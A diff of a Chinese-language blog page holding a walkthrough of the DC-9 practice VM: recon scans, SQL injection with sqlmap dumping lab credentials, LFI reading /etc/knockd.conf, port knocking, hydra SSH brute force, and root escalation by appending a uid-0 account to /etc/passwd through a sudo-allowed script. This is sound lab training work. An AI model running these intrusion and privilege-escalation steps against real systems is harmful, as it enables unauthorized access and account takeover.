@@ -112,30 +112,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/14/Port%20Knocking/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&text=DC-9 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&title=DC-9 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&is_video=false&description=DC-9 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=DC-9 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&title=DC-9 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&title=DC-9 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&title=DC-9 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&title=DC-9 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&name=DC-9 Writeup&description=&lt;p&gt;该靶机难度中等。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/14/DC-9%20Writeup/&t=DC-9 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 网页信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
     </div>
@@ -162,8 +144,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-13T16:00:00.000Z" itemprop="datePublished">2022-05-14</time>
-        
-        (Updated: <time datetime="2022-05-14T11:38:40.274Z" itemprop="dateModified">2022-05-14</time>)
         
       
     </div>
@@ -210,11 +190,9 @@
 </ul>
 <h1 id="信息收集">2. 信息收集</h1>
 <h2 id="端口信息">2.1. 端口信息</h2>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">sudo</span> arp-scan -l
-<span class="token number">2</span>. <span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.45
-<span class="token number">3</span>. <span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">10.0</span>.2.45<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.45</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.45</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514150308.png" /></p>
-<p>这里注意，22 端口变成了 filtered，如果此时直接连接，比如输入以下命令： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> root@10.0.2.45<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>这里注意，22 端口变成了 filtered，如果此时直接连接，比如输入以下命令： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.0.2.45</span><br></pre></td></tr></table></figure></p>
 <p>会直接报错。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192237.png" /></p>
 <h2 id="网页信息">2.2. 网页信息</h2>
@@ -224,33 +202,9 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191236.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191256.png" /></p>
 <p>将其丢入sqlmap中跑，得到两个数据库，将其中重要信息全部保存如下：</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">+--------+----------+--------------------------------------------------+
-| UserID | Username | Password                                         |
-+--------+----------+--------------------------------------------------+
-| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |
-+--------+----------+--------------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------+----------+--------------------------------------------------+</span><br><span class="line">| UserID | Username | Password                                         |</span><br><span class="line">+--------+----------+--------------------------------------------------+</span><br><span class="line">| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |</span><br><span class="line">+--------+----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure>
 <p>（直接利用sqlmap破解了密码）</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">+----+-----------+---------------+
-| id | username  | password      |
-+----+-----------+---------------+
-| 1  | marym     | 3kfs86sfd     |
-| 2  | julied    | 468sfdfsd2    |
-| 3  | fredf     | 4sfd87sfd1    |
-| 4  | barneyr   | RocksOff      |
-| 5  | tomc      | TC&amp;TheBoyz    |
-| 6  | jerrym    | B8m#48sd      |
-| 7  | wilmaf    | Pebbles       |
-| 8  | bettyr    | BamBam01      |
-| 9  | chandlerb | UrAG0D!       |
-| 10 | joeyt     | Passw0rd      |
-| 11 | rachelg   | yN72#dsd      |
-| 12 | rossg     | ILoveRachel   |
-| 13 | monicag   | 3248dsds7s    |
-| 14 | phoebeb   | smellycats    |
-| 15 | scoots    | YR3BVxxxw87   |
-| 16 | janitor   | Ilovepeepee   |
-| 17 | janitor2  | Hawaii-Five-0 |
-+----+-----------+---------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+----+-----------+---------------+</span><br><span class="line">| id | username  | password      |</span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| 1  | marym     | 3kfs86sfd     |</span><br><span class="line">| 2  | julied    | 468sfdfsd2    |</span><br><span class="line">| 3  | fredf     | 4sfd87sfd1    |</span><br><span class="line">| 4  | barneyr   | RocksOff      |</span><br><span class="line">| 5  | tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| 6  | jerrym    | B8m#48sd      |</span><br><span class="line">| 7  | wilmaf    | Pebbles       |</span><br><span class="line">| 8  | bettyr    | BamBam01      |</span><br><span class="line">| 9  | chandlerb | UrAG0D!       |</span><br><span class="line">| 10 | joeyt     | Passw0rd      |</span><br><span class="line">| 11 | rachelg   | yN72#dsd      |</span><br><span class="line">| 12 | rossg     | ILoveRachel   |</span><br><span class="line">| 13 | monicag   | 3248dsds7s    |</span><br><span class="line">| 14 | phoebeb   | smellycats    |</span><br><span class="line">| 15 | scoots    | YR3BVxxxw87   |</span><br><span class="line">| 16 | janitor   | Ilovepeepee   |</span><br><span class="line">| 17 | janitor2  | Hawaii-Five-0 |</span><br><span class="line">+----+-----------+---------------+</span><br></pre></td></tr></table></figure>
 <p>尝试之后发现，只有admin能够登录后台</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191558.png" /></p>
 <p>登录后台之后，再次点击 Manage，出现了奇怪的字符，猜测可能存在LFI。虽然不知道参数名，但是一般都是file，filename，path之类的，先尝试一下，实在不行在爆破</p>
@@ -259,85 +213,33 @@
 <h1 id="get-shell">3. get shell</h1>
 <p>经过搜索如何绕过 "ssh filtered"，发现了这是一个端口保护的机制，叫做 Port Knocking。</p>
 <p>简单来说就是默认把ssh上锁，不允许远程连接。并且设置一个端口序列，只有按照该序列访问对应的端口，才能够使 ssh 变成 open。这样子，才能够远程连接。而默认的序列文件的路径为：/etc/knockd.conf。</p>
-<p>利用LFI读取其中的内容：（只记录了序列） <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// /etc/knockd.conf
-sequence: 7469, 8475, 9842<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>然后依次执行下列命令： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. nmap -p <span class="token number">7469</span>
-<span class="token number">2</span>. nmap -p <span class="token number">8475</span>
-<span class="token number">3</span>. nmap -p <span class="token number">9842</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>利用LFI读取其中的内容：（只记录了序列） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// /etc/knockd.conf</span><br><span class="line">sequence: 7469, 8475, 9842</span><br></pre></td></tr></table></figure></p>
+<p>然后依次执行下列命令： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. nmap -p 7469</span><br><span class="line">2. nmap -p 8475</span><br><span class="line">3. nmap -p 9842</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192323.png" /></p>
-<p>然后再次查看22端口的情况，发现变成了open <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p <span class="token number">22</span> <span class="token number">10.0</span>.2.45<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后再次查看22端口的情况，发现变成了open <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22 10.0.2.45</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192402.png" /></p>
 <p>接着利用 hydra 爆破上面所搜集的所有用户名和密码，得到下面三个可以使用的</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// ssh 爆破
-login: chandlerb   password: UrAG0D!
-login: joeyt   password: Passw0rd
-login: janitor   password: Ilovepeepee<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ssh 爆破</span><br><span class="line">login: chandlerb   password: UrAG0D!</span><br><span class="line">login: joeyt   password: Passw0rd</span><br><span class="line">login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>
 <h1 id="权限提升">4. 权限提升</h1>
-<p>随便一个之后进行信息收集，发现既没有suid，也没有sudo，也没有内核，也没有可疑进程，直到看到 janitor 的家目录下的某个文件 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// /home/janitor/passwords-found-on-post-it-notes.txt
-BamBam01
-Passw0rd
-smellycats
-P0Lic#10-4
-B4-Tru3-001
-4uGU5T-NiGHts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>将这些密码添加到刚刚爆破的密码字典中，再次进行爆破，得到一个新的结果： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">login: fredf   password: B4-Tru3-001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>随便一个之后进行信息收集，发现既没有suid，也没有sudo，也没有内核，也没有可疑进程，直到看到 janitor 的家目录下的某个文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// /home/janitor/passwords-found-on-post-it-notes.txt</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure></p>
+<p>将这些密码添加到刚刚爆破的密码字典中，再次进行爆破，得到一个新的结果： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login: fredf   password: B4-Tru3-001</span><br></pre></td></tr></table></figure></p>
 <p>登录该用户，发现终于有 sudo -l 了</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192709.png" /></p>
-<p>查看该文件的权限以及内容 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">ls</span> -l /opt/devstuff/dist/test/test
-<span class="token number">2</span>. strings /opt/devstuff/dist/test/test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>基本看不懂。直接执行得到帮助信息 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fredf@dc-9:/opt/devstuff/dist/test$ ./test
-Usage: python test.py <span class="token builtin class-name">read</span> append<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>但是还是看不懂，并且这个 test.py 就很可疑，猜测这就是编译之前的文件。因此顺着目录往回找，终于在 /opt/devstuff 目录下找到了 test.py 文件，其内容为： <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
-
-<span class="token keyword">import</span> sys
-
-<span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">:</span>
-    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Usage: python test.py read append"</span><span class="token punctuation">)</span>
-    sys<span class="token punctuation">.</span>exit <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-
-<span class="token keyword">else</span> <span class="token punctuation">:</span>
-    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
-    output <span class="token operator">=</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
-    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>output<span class="token punctuation">)</span>
-    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>查看该文件的权限以及内容 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. ls -l /opt/devstuff/dist/test/test</span><br><span class="line">2. strings /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure></p>
+<p>基本看不懂。直接执行得到帮助信息 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/test$ ./test</span><br><span class="line">Usage: python test.py read append</span><br></pre></td></tr></table></figure></p>
+<p>但是还是看不懂，并且这个 test.py 就很可疑，猜测这就是编译之前的文件。因此顺着目录往回找，终于在 /opt/devstuff 目录下找到了 test.py 文件，其内容为： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure></p>
 <p><strong>说白了就是指定两个文件，会将第一个文件的内容追加到第二个文件中</strong>。</p>
 <p>因此，思路就很清晰了，我们可以在 /etc/passwd 中追加一个 “root” 用户就好了。</p>
-<p>首先，执行下述命令，创建一个文件，并且写入需要加入到 /etc/passwd 中的内容。 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token string">"hdf:E1s2b9dIx7vPM:0:0:root:/root:/bin/bash"</span> <span class="token operator">></span> s.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>首先，执行下述命令，创建一个文件，并且写入需要加入到 /etc/passwd 中的内容。 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hdf:E1s2b9dIx7vPM:0:0:root:/root:/bin/bash&quot; &gt; s.txt</span><br></pre></td></tr></table></figure></p>
 <p>（注意，这里的密码可以用 <code>openssl passwd [内容]</code> 生成，如果追加的内容没有密码，则无法登录！）</p>
-<p>然后执行下面命令，将内容写入 /etc/passwd <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> /opt/devstuff/dist/test/test s.txt /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后执行下面命令，将内容写入 /etc/passwd <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test s.txt /etc/passwd</span><br></pre></td></tr></table></figure></p>
 <p>接着，查看 /etc/passwd 的内容</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514193450.png" /></p>
 <p>（红框中的都是我测试的，只有最后一个可以）</p>
 <p>最后，切换到 hdf 用户</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514193554.png" /></p>
 <p>收尾工作就是读取flag了</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">root@dc-9:~# cat theflag.txt
-
-
-███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
-████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
-██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
-██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
-██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
-╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
-                                                                             
-Congratulations - you have done well to get to this point.
-
-Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
-who have taken the time to complete the various DC challenges.
-
-I also want to send out a big thank you to the various members of @m0tl3ycr3w .
-
-They are an inspirational bunch of fellows.
-
-Sure, they might smell a bit, but...just kidding.  :-)
-
-Sadly, all things must come to an end, and this will be the last ever
-challenge in the DC series.
-
-So long, and thanks for all the fish.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@dc-9:~# cat theflag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge in the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks for all the fish.</span><br></pre></td></tr></table></figure>
 <h1 id="总结">5. 总结</h1>
 <p>该靶机对于我来说比较简单，还让我学到了一个新的知识。涉及的攻击方法有：</p>
 <ol type="1">
@@ -403,7 +305,6 @@ So long, and thanks for all the fish.<span aria-hidden="true" class="line-number
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
